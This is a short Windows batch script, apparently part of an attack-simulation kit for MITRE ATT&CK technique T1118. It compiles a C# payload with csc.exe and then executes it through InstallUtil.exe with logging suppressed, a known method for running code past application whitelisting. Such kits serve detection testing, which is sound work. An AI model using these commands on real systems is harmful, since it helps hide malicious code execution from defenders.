@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Suspicious Executions via InstallUtil (T1118)
ECHO.
ECHO [+] Compiling Source code using 'csc.exe'  
ECHO -------------------------------------------------------------------
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library %PAYLOAD%\T1118\T1118.cs
ECHO.


ECHO [+] Leveraging 'InstallUtil.exe' to execute the payload 
ECHO -------------------------------------------------------------------
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %PAYLOAD%T1118\T1118.dll
ECHO.
